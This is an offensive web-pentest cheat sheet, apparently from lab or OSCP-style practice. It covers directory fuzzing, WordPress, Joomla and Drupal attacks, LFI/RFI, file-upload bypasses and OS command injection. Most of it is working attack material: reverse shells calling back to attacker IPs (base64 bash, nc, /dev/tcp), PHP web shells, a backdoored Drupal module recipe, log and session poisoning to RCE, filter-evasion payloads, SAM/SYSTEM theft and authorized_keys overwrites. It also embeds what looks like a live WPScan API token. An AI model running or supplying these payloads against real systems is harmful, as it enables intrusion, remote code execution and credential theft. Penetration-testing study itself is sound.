# HTTP Checklist

#### Fingerprint with Nmap, then run script to enumerate further
```bash
sudo nmap -p80 --script=http-enum $ip
```
#### Analyze tech stack with Wappalyzer

#### Fuzzing directories and files

```bash
# /opt/SecLists/Discovery/Web-Content/megadirlow.txt
gobuster dir -u http://$url:9000 -w /opt/SecLists/Discovery/Web-Content/megadir.txt -k -t 30
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/megadirlow.txt --hc 404 "http://$url:50000/FUZZ/"
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$url/FUZZ"
gobuster dir -u $url -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -erk -t 30 -x php,txt,html,whatever
feroxbuster -k -u $url:3000 -o feroxbuster.out -w /opt/SecLists/Discovery/Web-Content/megadir.txt -b "connect.sid=s%3Awy8r5K11MKvRQ7w5lr8QS9KyHJr_q92B.2fbWC6h%2FH6u7sCs06k4dwmYRTFkdvhy%2BdwOjxLaufwA; userLevel=YWRtaW4%3d"
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/megadir.txt --hc 404 -d "SESSIONID=value" "$url"
ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106

# If you get hits, try to discover more directories using a more niche wordlist

# IIS Additional Fuzzing
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/iis-systemweb.txt -o $DIR/iis-systemweb-$1-$2.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt -o $DIR/IIS-fuzz-$1-$2txt
java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt # If iis_.. returned TRANSF~1.ASP
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
/opt/SecLists/Discovery/Web-Content/content_discovery_all.txt

# Additional Apache Fuzzing
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/apache.txt -o $DIR/apache-$1-$2.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/apacheFuzz.txt -o $DIR/apacheFuzz-$1-$2.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/apacheTomcat.txt -o $DIR/apacheTomcat-$1-$2.txt

# Duplex fuzzing
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/Apache.fuzz.txt -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 28 $url/FUZZ
```

#### Fuzzing Subdomains & vhosts

```bash
gobuster dns -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
python dome.py -m active -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$dom" -u http://$ip:8080
feroxbuster -k -u $url -x php -o vhost.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
[Enter] -> c -f {number of search to cancel}
```

##### Fuzzing URL

An amazing resource is Cobalt's SSTI page.
```bash
# Copy request from burpsuite to file, search.req
# Insert FUZZ where you want to fuzz
ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
# Below for post
# ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt:FUZZ -fs 61
# If you wanted to match size of a particular response, you could add '-ms 0'
# Filtering by lines would be '--fl 34'
# Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
# Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
&query=sup')%2Bprint('hi')%23
&query=sup')%2B__import__('os').system('id')%23
&query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
```

#### Fuzzing URL

```bash
# Multiple paramaters
ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwords.txt:PASS

# Fuzzing directly in URL, in this case, testing for parameters.
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
ffuf -k -u https://streamio.htb/admin/?FUZZ=1 -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt

# If you need to be authorized/logged in
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'

# SQLi
ffuf -request sql.req -request-proto http -w ~/repos/offsec/lists/sqli.txt:FUZZ

# LFI
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u $url/?page=FUZZ
```

#### Fuzzing APIs

You can use the same commands for testing url parameters.

```bash
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/objects.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_words.txt --hc 404 $url/FUZZ
ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/lil-fuzz.txt
ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/sqli.txt
fuff -u $url/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-characters.txt -mc 200,500 -fw 9
curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}'$url:13337/update
cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
sed -i 's/^/{GOBUSTER}\//' apis
gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/megadir.txt -p apis
# Start testing with curl for ssti.
curl -si --data "code=1+1" # {7*7}...
curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
```

#### Interacting with APIs

```bash
curl $url/api.php/city/london 	# Read entry
curl -s $url/api.php/city/ \| jq #	Read all entries
curl -X POST $url/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' #	Create (add) entry
curl -X PUT $url/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' #	Update (modify) entry
curl -X DELETE $url/api.php/city/New_HTB_City #	Delete entry
```

#### Curl

```bash
curl -s -O inlanefreight.com/index.html #	Download file
curl -k https://inlanefreight.com #	Skip HTTPS (SSL) certificate validation
curl -i https://www.inlanefreight.com #	Print response headers and response body
curl -u admin:admin $url/ #	Set HTTP basic authorization credentials
curl http://admin:admin@$ip:$port/ #	Pass HTTP basic authorization credentials in the URL
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' $url/ # Set request header
curl -X POST -d 'username=admin&password=admin' $url/ #	Send POST request with POST data
curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' $url/ #	Set request cookies
curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' $url/search.php #	Send POST request with JSON data
```

#### Ffuf

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u $url/index/FUZZ #	Extension Fuzzing
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt:FUZZ -u $url/blog/FUZZ.php #	Page Fuzzing
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt:FUZZ -u $url/FUZZ -recursion -recursion-depth 1 -e .php -v #	Recursive Fuzzing
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/ #	Sub-domain Fuzzing
ffuf -w wordlist.txt:FUZZ -u $url/ -H 'Host: FUZZ.academy.htb' -fs xxx #	VHost Fuzzing
ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php?FUZZ=key -fs xxx #	Parameter Fuzzing - GET
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php -X POST -d 'FUZZ=id' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Parameter Fuzzing - POST
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u $url/admin/admin.php -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Parameter Fuzzing - POST
ffuf -w ids.txt:FUZZ -u $url/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx #	Value Fuzzing
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u '$url/index.php?FUZZ=value' -fs 2287 #	Fuzz page parameters
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u '$url/index.php?language=FUZZ' -fs 2287 #	Fuzz LFI payloads
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u '$url/index.php?language=../../../../FUZZ/index.php' -fs 2287 #	Fuzz webroot path
ffuf -w ./LFI-WordList-Linux:FUZZ -u '$url/index.php?language=../../../../FUZZ' -fs 2287 #	Fuzz server configurations
```

#### Nikto

```bash
nikto --host $url -ssl -evasion 1
nikto -ask=no -nointeractive -host $url 2>&1
nikto -ask=no -host $url 2>&1
```

#### Manual code inspection

DONT IGNORE THIS.

- Look for emails, names, user info, versioning checking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
- Inspect every fkn inch of the website

(http://editorial.htb/upload?

#### LFI

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

```bash
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u $url/?page=FUZZ
```

#### KNOW THAT YOU CAN PIVOT TO WHOEVER IS RUNNING HTE WEBSERVER ONCE YOU HAVE INITIAL ACCESS. or write abilities in a web folder.

#### WordPress

WPscan if it's wordpress. Add "-U $user -P $pass if you have credentials".

```bash
wpscan --url $url --enumerate p --plugins-detection aggressive # aggressive plugin detection
wpscan --url $url --disable-tls-checks --enumerate vp,vt,u,dbe --plugins-detection aggressive --plugins-version-detection aggressive --api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY
wpscan --url $url --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
```

```bash
gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -k -t 10 --exclude-length 6
gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -t 10 --exclude-length 6
```

Brute force login.

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Malicious plugin.

- Go to admin page > Plugins --> Add New
- Upload the zip https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/dist/wordpress-webshell-plugin-1.1.0.zip and activate the plugin
- Download https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/console.py

```bash
python console.py -t $url/wordpress
```

Or go to theme editor, insert php webshell code and go crazy.

Money file is "wp-config.php".

Login.

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

```bash
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -o $DIR/wordpress.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -o $DIR/wpplugin.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -o $DIR/wpthemes.txt
```

#### Joomla

- Fingerprint version from README.txt file, or from javascript files in "media/system/js/" directory, or navigating to "administrator/manifests/files/joomla.xml", "plugins/system/cache/cache.xml"

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
python2.7 joomlascan.py -u http://dev.inlanefreight.local
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

```bash
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt -o $DIR/joomla-plugins.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/joomla-themes.fuzz.txt -o $DIR/joomla-themes.txt
```

- If logged in, customize template and insert webshell code

#### Drupal

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

PHP Filter Module.

- If pre-V8, enable php filter module -> go to content -> add content & create basic page.
- Make sure Text format is PHP code
- If post-V8, go to updates -> install -> and upload the module yourself "https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz"

```bash
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

Backdoored module.

```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
# Create a PHP web shell with the contents
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
# Create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
# The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
# Manage -> extend -> + Install new module -> upload
```

```bash
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/drupal-themes.fuzz.txt -o $DIR/drupal-themes.txt
gobuster dir -e -q -n -u http://$1:$2 -k -w /opt/SecLists/Discovery/Web-Content/CMS/Drupal.txt -o $DIR/Drupal.txt
```

#### Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.

#### Brute forcing admin/login panel with Burp Intruder

#### Input Form

- Try SSTI 

```bash
42*42
{42*42}
{{42*42}}
{{{42*42}}}
#{42*42}
${42*42}
<%=42*42 %>
{{=42*42}}
{^xyzm42}1764{/xyzm42}
${donotexists|42*42}
[[${42*42}]]
```

#### Create a wordlist from the webpage using cewl:

```bash
cewl -g --with-numbers -d 20 $url |grep -v CeWL >> custom-wordlist.txt
cewl http://example.com -d 4 -m 5 -w cewl.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt > cewl-best64.txt
```

#### Other CMS

```bash
droopescan -t <number_of_threads> <target_website>
joomscan --ec -u $RHOST:$RPORT_HTTP
```

#### XSS (Input Fields)
- Spam special characters, see what is filtered, what gets interpreted as code

```bash
~!@#$%^&*()-_+={}][|\`,./?;:'"<>
${{<%[%'"}}%\. # SSTI, didn't know where to put
```

- If our input is being added between div tags, we'll need to include our own script tags4 and need to be able to inject "<" and ">" as part of the payload
- If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code

#### 403 Forbidden Bypass

Refer to 403-forbidden-bypass.sh.

#### Header Injection

- Check if you can inject the following into the User-Agent header:

```bash
<script>alert(42)</script>
# or the following to see if it pings your python http server
<a href="http://192.168.192.121:8000/your-endpoint">Send GET Request</a>
```

If so, try injecting a reverse shell.

```bash
# on your machine, try to remove all special characters through strategic spacing
echo -n 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1' | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d | bash
# or
echo -n "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'" | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d
# or the following if spaces aren't allowed
{echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
```

#### Directory Traversal

- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../". DO THISS THIS SHTISITHSIT .

- If there's something like "https://example.com/cms/login.php?language=en.html", then try to navigate to the file directly with "https://example.com/cms/en.html". If you can, this confirms that en.html is a file on the server and it may be vulnerable to something like "http://example.com/subdir/index.php?page=../../../../../../../../../etc/passwd"

- Try double and triple encoding, "..././", "..;/", and potentially unicode encoding as referenced in the document below

- Refer to (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#16-bits-unicode-encoding) for a whole bunch of awesome payloads, and interesting files to look for on both Windows and Linux. Doesn't include "C:\Windows\System32\drivers\etc\hosts", "C:\inetpub\logs\LogFiles\W3SVC1\\", and "C:\inetpub\wwwroot\web.config"

Try seeing if you can get the php source code:

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```
I ran into a page that said "Only accessable through includes". This is referring to a header, "include=", where you can include files and possibly execute code.

WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.

```bash
include=echo+WAZZUP%3b
include=/etc/passwd
include=http://10.10.14.8:8000/fake
include=http://10.10.14.8:8000/reverse-shell.php
include=reverse-shell.php
```
When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.

If that doesn't work, you could have him connect back to us so that we could crack the hash.

Check out the sam and system files:

```bash
wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csystem.old -O SYSTEM
wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csam.old -O SAM
```

```bash
/index.php?language=/etc/passwd #	Basic LFI
/index.php?language=../../../../etc/passwd #	LFI with path traversal
/index.php?language=/../../../etc/passwd #	LFI with name prefix
/index.php?language=./languages/../../../../etc/passwd #	LFI with approved path
/index.php?language=....//....//....//....//etc/passwd #	Bypass basic path traversal filter
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 #	Bypass filters with URL encoding
/index.php?language=non_existing_directory/../../../etc/passwd/./././. # [./ REPEATED ~2048 times] 	Bypass appended extension with path truncation (obsolete)
/index.php?language=../../../../etc/passwd%00 #	Bypass appended extension with null byte (obsolete)
/index.php?language=php://filter/read=convert.base64-encode/resource=config # or config.php, Read PHP with base64 filter
```

#### Log Poisoning / Local File Inclusion

- RCE (PHP) through log poisoning (likely /var/log/apache2/access.log). See if you can read the file and see what contents are stored (i.e. User-Agent):

```bash
curl http://example.com/subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

If so, use Burp to change the user agent header:
```bash
<?php echo system($_GET['cmd']); ?>
```

And see if you can execute commands like the following, if so, try a url encoded bash or php reverse shell:

```
GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```

..if something else, do something else.

```bash
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd #	Read PHP session parameters
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E #	Poison PHP session with web shell
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id #	RCE through poisoned PHP session
curl -s "$url/index.php" -A '<?php system($_GET["cmd"]); ?>' #	Poison server log
/index.php?language=/var/log/apache2/access.log&cmd=id #	RCE through poisoned PHP session
```

#### PHP Wrappers

Attempt to show the contents of php file:

```bash
curl http://example.com/subdir/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Attempt to achieve code execution:

```bash
curl "http://example.com/subdir/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
# if works, then
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://example.com/subdir/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
# or a reverse shell
```

```bash
php://filter/read=convert.base64-encode/resource=index.php
```

```bash
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id #	RCE with data wrapper
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "$url/index.php?language=php://input&cmd=id" #	RCE with input wrapper
curl -s "$url/index.php?language=expect://id" #	RCE with expect wrapper
```


#### Remote File Inclusion

- If the website is loading files or contents from remote systems, then RFI may be possible. You can go into Developer Tools to discover this in source, etc.

```bash
cp /usr/share/webshells/php/simple-backdoor.php .
python3 -m http.server
curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.php&cmd=ls"
```

Windows:

```bash
view=C:/windows/system32/drivers/etc/hosts
view=//$myip/test/share
```

```bash
http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
```

#### File Upload Vulns (Executable)

File signatures: "https://en.wikipedia.org/wiki/List_of_file_signatures"
File signatures complete: "https://garykessler.net/library/file_sigs.html"
ASP Upload: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP"
PHP Extensions: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst"

THINK ABOUT RCE WHENEVER YOU HAVE LFI.

THINK ABOUT LOCAL FILE INCLUSION.

- For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.
- You can upload as cmd.jpg then intercept and switch to cmd.jpg.php & cmd.php.jpg.
- Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.
- Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
- Try to inject characters before, after extension, "%20, %0a, %00, %0d0a, /, .\, ."

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
echo "<?php system(\$_REQUEST['cmd']); ?>" >> mime_shell.php.png
```

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif #	Create malicious image
```

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php #	Create malicious zip archive 'as jpg'
/index.php?language=zip://shell.zip%23shell.php&cmd=id #	RCE with malicious uploaded zip
```

- Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.
- See if you can intercept and modify the files, naming the php file shell.txt initially, then changing it to shell.php.
- With Windows, replace php with aspx in the examples if you don't know what to use.
- If you're able to upload a simple webshell, then see if you can execute commands:
- Inspect website image to try and uncover directory, modify accepted extensions, or even remove the check
- Try to modify content type to 'image/jpg', 'image/jpeg', 'image/png', 'image/gif'

```bash
curl http://example.com/meteor/subdir/simple-backdoor.pHP?cmd=dir
```

Here's a crazy good resource for a high level gauntlet of what you can do, "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload".

If you can, then get a reverse shell with powershell (>-<):

```bash
kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...
```

- See if you can overwrite files, such as authorized_keys. Worst case, you may get information about the web stack

#### Bypassing File Upload Extension with Phar

Phar is basicaly a zip that allows you to navigate to files within and execute with PHP. You can simply rename the phar to another extension name, such as jpeg.

Note that is your php reverse shell isn't working, but you can echo strings, check phpinfo() for disable_functions and see what you're able to run. An example of proc_open is in scripts directory.


```bash
zip test.phar reverse.php
mv test.phar test.jpeg

GET /?page=phar://uploads/test.jpeg/reverse
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg #	Create malicious phar 'as jpg'
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id #	RCE with malicious uploaded phar
```

#### Uploading "GIF"

If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists.

Also try "GIF87a"

```bash
GIF89a;
<?php system($_GET["cmd"]); ?>
```

#### Fuzzing Extensions with Burp

- Intercept POST request -> Sniper
- Put squiglies around file$.php$
- Run with extensions from "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst"

- Same
- Run with extensions from "https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" to see what extensions are whitelisted

#### File Upload Vulns (Non-Executable)

- When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

- With Burp, try testing directory traversal by modifying the file's name. If the response includes the modified pathname, then it's a good sign that it worked, though it could've just sanitized it internally.

- If this works, then try to blindly overwrite write in the database, such as the ssh key, and then ssh in:

```bash
kali@kali:~$ ssh-keygen
kali@kali:~$ cat keyname.pub > authorized_keys
```

Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.

#### File Inclusion Functions

```bash
#              Read Content | Execute | Remote URL
## PHP 			
include()/include_once() 	Y 	Y 	Y
require()/require_once() 	Y 	Y 	X
file_get_contents() 	    Y 	X 	Y
fopen()/file() 	            Y 	X 	X
## NodeJS 			
fs.readFile() 	            Y 	X 	X
fs.sendFile() 	            Y 	X 	X
res.render() 	            Y 	Y 	X
## Java 			
include 	                Y 	X 	X
import 	                    Y 	Y 	Y
## .NET 			
@Html.Partial() 	        Y   X   X
@Html.RemotePartial() 	    Y 	X 	Y
Response.WriteFile() 	    Y 	X 	X
include 	                Y 	Y 	Y
```

#### Remote URL ^^ -> Host Your Own Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server 80 #	Host web shell
/index.php?language=http://$myip/shell.php&cmd=id #	Include remote PHP web shell
```

#### Try to Intercept Inject Username with Reset Password Functionality

#### OS Command Injection

Commands.

```bash
; 	%3b #	Both
\n 	%0a #	Both
& 	%26 #	Both (second output generally shown first)
| 	%7c #	Both (only second output is shown)
&& 	%26%26 #	Both (only if first succeeds)
|| 	%7c%7c #	Second (only if first fails)
`command` 	%60%60 #	Both (Linux-only)
$(command) 	%24%28%29 #	Both (Linux-only)
```

Filtered Character Bypass (Linux).

```bash
printenv #	Can be used to view all environment variables
# Spaces 	
%09 #	Using tabs instead of spaces
${IFS} #	Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())
{ls,-la} #	Commas will be replaced with spaces
#Other Characters 	
${PATH:0:1} #	Will be replaced with /
${LS_COLORS:10:1} #	Will be replaced with ;
$(tr '!-}' '"-~'<<<[) #	Shift character by one ([ -> \)
```

Filtered Character Bypass (Windows).

```bash
Get-ChildItem Env: #	Can be used to view all environment variables - (PowerShell)
# Spaces 	
%09 #	Using tabs instead of spaces
%PROGRAMFILES:~10,-5% #	Will be replaced with a space - (CMD)
$env:PROGRAMFILES[10] #	Will be replaced with a space - (PowerShell)
# Other Characters 	
%HOMEPATH:~0,-17% #	Will be replaced with \ - (CMD)
$env:HOMEPATH[0] #	Will be replaced with \ - (PowerShell)
```

Blacklisted Command Bypass (Linux).

```bash
# Character Insertion 	
' or " #	Total must be even'
$@ or \ #	Linux only
# Case Manipulation 	
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #	Execute command regardless of cases
$(a="WhOaMi";printf %s "${a,,}") #	Another variation of the technique
# Reversed Commands 	
echo 'whoami' | rev #	Reverse a string
$(rev<<<'imaohw') #	Execute reversed command
# Encoded Commands 	
echo -n 'cat /etc/passwd | grep 33' \| base64 #	Encode a string with base64
bash<<<$(base64 -d<<<ZWNobyBoZWxsbw==) #	Execute b64 encoded string
```

Blacklisted Command Bypass (Windows).

```bash
# Character Insertion 	
' or " #	Total must be even'
^ #	Windows only (CMD)
# Case Manipulation 	
WhoAmi 	Simply send the character with odd cases
# Reversed Commands 	
"whoami"[-1..-20] -join '' #	Reverse a string
iex "$('imaohw'[-1..-20] -join '')" #	Execute reversed command
# Encoded Commands 	
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) #	Encode a string with base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" #	Execute b64 encoded string
```

